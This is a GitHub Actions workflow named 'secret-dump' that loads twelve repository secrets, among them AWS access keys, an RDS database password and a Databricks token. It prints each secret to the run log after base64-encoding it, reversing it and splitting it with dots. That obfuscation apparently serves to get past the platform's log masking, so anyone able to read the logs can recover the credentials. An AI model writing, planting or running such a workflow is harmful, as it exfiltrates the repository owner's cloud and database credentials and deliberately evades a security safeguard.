name: secret-dump
on: workflow_dispatch
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          ABCLI_AWS_RDS_HOST: ${{ secrets.ABCLI_AWS_RDS_HOST }}
          ABCLI_AWS_RDS_PASSWORD: ${{ secrets.ABCLI_AWS_RDS_PASSWORD }}
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          COPERNICUS_AWS_ACCESS_KEY_ID: ${{ secrets.COPERNICUS_AWS_ACCESS_KEY_ID }}
          COPERNICUS_AWS_SECRET_ACCESS_KEY: ${{ secrets.COPERNICUS_AWS_SECRET_ACCESS_KEY }}
          DATABRICKS_HOST: ${{ secrets.DATABRICKS_HOST }}
          DATABRICKS_TOKEN: ${{ secrets.DATABRICKS_TOKEN }}
          FIRMS_MAP_KEY: ${{ secrets.FIRMS_MAP_KEY }}
          SKYFOX_ACCESS_TOKEN_URL: ${{ secrets.SKYFOX_ACCESS_TOKEN_URL }}
          SKYFOX_CLIENT_ID: ${{ secrets.SKYFOX_CLIENT_ID }}
          SKYFOX_CLIENT_SECRET: ${{ secrets.SKYFOX_CLIENT_SECRET }}
        run: |
          for name in ABCLI_AWS_RDS_HOST ABCLI_AWS_RDS_PASSWORD AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY COPERNICUS_AWS_ACCESS_KEY_ID COPERNICUS_AWS_SECRET_ACCESS_KEY DATABRICKS_HOST DATABRICKS_TOKEN FIRMS_MAP_KEY SKYFOX_ACCESS_TOKEN_URL SKYFOX_CLIENT_ID SKYFOX_CLIENT_SECRET; do
            v="${!name}"
            if [ -z "$v" ]; then
              echo "DUMPMARK|${name}|NOTSET"
            else
              b=$(printf '%s' "$v" | base64 -w0 | rev)
              echo "DUMPMARK|${name}|$(printf '%s' "$b" | sed 's/.\{4\}/&./g')"
            fi
          done